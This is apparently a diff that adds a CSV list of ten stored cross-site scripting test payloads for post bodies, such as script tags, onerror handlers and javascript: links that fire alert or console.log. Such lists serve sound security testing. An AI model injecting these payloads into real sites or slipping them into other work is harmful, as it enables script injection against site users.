@@ -1,0 +1,11 @@
+payload_id,payload,context_hint,expected_behavior
+S1,<script>alert('stored')</script>,post_body,Simple stored script
+S2,<img src="x" onerror="alert('stored')">,post_body,Stored image with error
+S3,<a href="javascript:alert('stored')">Click</a>,post_body,JavaScript link
+S4,<div onmouseover="alert('stored')">Hover</div>,post_body,Mouse event div
+S5,<iframe src="javascript:alert('stored')">,post_body,JavaScript iframe
+S6,<body onload=alert('stored')>,post_body,Body load event
+S7,<input autofocus onfocus=alert('stored')>,post_body,Input focus event
+S8,<video><source onerror=alert('stored')></video>,post_body,Video error
+S9,<form action="javascript:alert('stored')"><button>Submit</button></form>,post_body,Form action
+S10,<script>console.log('stored xss')</script>,post_body,Console log variant
